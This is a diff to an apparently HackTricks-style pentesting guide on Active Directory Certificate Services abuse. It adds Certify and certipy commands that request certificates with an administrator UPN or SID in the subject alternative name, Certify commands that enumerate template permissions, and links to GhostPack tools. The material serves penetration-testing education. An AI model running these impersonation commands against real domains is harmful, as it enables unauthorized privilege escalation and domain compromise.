@@ -43,8 +43,19 @@ certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 To **abuse this vulnerability to impersonate an administrator** one could run:
 
 ```bash
-Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
-certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
+# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
+Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local
+
+# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
+Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500
+
+# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
+Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
+  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500
+
+# Certipy equivalent
+certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
+  -template 'ESC1' -upn 'administrator@corp.local'
 ```
 
 Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
@@ -151,6 +162,13 @@ Notable permissions applicable to certificate templates include:
 - **WriteProperty:** Authorizes the editing of any object properties.
 
 ### Abuse
+
+To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:
+
+```bash
+Certify.exe find /showAllPermissions
+Certify.exe pkiobjects /domain:corp.local /showAdmins
+```
 
 An example of a privesc like the previous one:
 
@@ -1010,6 +1028,8 @@ Both scenarios lead to an **increase in the attack surface** from one forest to 
 ## References
 
 - [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
+- [GhostPack/Certify](https://github.com/GhostPack/Certify)
+- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
